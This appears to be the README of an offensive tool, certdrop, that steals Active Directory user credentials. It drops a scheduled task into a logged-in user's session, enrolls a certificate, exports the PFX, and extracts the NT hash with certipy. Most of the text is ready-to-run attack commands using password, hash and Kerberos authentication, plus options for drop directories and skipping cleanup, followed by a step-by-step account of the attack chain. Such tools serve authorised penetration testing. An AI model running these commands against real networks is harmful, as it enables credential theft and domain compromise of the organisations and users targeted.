# certdrop

ADCS certificate theft via scheduled task session hijacking.

Drops a scheduled task on a target that runs in an active user's session context (`InteractiveToken`), enrolls a certificate via `certreq`, exports the PFX, and runs `certipy auth` to extract the NT hash.

## Install

```bash
git clone https://github.com/mattmillen15/certdrop.git && cd certdrop
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
curl -sL https://raw.githubusercontent.com/sensepost/susinternals/main/psexecsvc.py -o psexecsvc.py
```

This installs [certipy](https://github.com/ly4k/Certipy) and [psexecsvc](https://github.com/sensepost/susinternals) (needed for `--exec-method smb`).

## Usage

```
certdrop [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
```

### Examples

```bash
# Password auth, interactive session picker
certdrop administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

# Target a specific user
certdrop administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith

# Domain auth
certdrop corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

# NTLM hash
certdrop administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1

# Kerberos
certdrop corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1

# Kerberos with ccache
export KRB5CCNAME=admin.ccache
certdrop corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1

# SMB exec (no WinRM needed)
certdrop admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb

# Manual mode — generate files and print instructions only
certdrop admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith

# Non-admin target (C:\Users\Public + cmd wrapper)
certdrop admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
  --drop-dir 'C:\Users\Public' --exec-wrapper cmd
```

### Options

| Flag | Description |
|------|-------------|
| `-ca HOST\CA` | CA config string (required) |
| `-dc IP` | Domain controller IP (required) |
| `-tu USER` | Target user (skip session picker) |
| `-H [LM:]NT` | NTLM hash |
| `-k` | Kerberos auth |
| `--aes-key HEX` | AES key for Kerberos |
| `--exec-method` | `winrm` (default), `smb`, `manual` |
| `--exec-wrapper` | `conhost` (default), `cmd`, `powershell`, `wscript` |
| `--drop-dir` | Remote drop directory (default: `C:\Windows\Tasks`) |
| `--template` | Certificate template (default: `User`) |
| `--timeout` | PFX wait timeout in seconds (default: 90) |
| `--ldap-shell` | LDAP shell via certipy instead of NT hash |
| `--no-cleanup` | Leave files and task on target |

## How it works

1. Connects via WinRM (default) or SMB (psexecsvc)
2. Enumerates active sessions and resolves domain via WMI
3. Uploads `cert.inf`, `cert.bat`, `cert.xml` via SMB
4. Creates scheduled task with `InteractiveToken` — runs in the target user's live session
5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
6. Polls for PFX via SMB, downloads it
7. Runs `certipy auth` to extract NT hash
8. Cleans up remote files and task

## Credits

- Technique from [NetExec PR #908](https://github.com/Pennyw0rth/NetExec/pull/908) by [@Tw1sm](https://github.com/Tw1sm)
- SMB execution via [susinternals](https://github.com/sensepost/susinternals) by [@sensepost](https://github.com/sensepost)
- Certificate auth via [Certipy](https://github.com/ly4k/Certipy) by [@ly4k](https://github.com/ly4k)
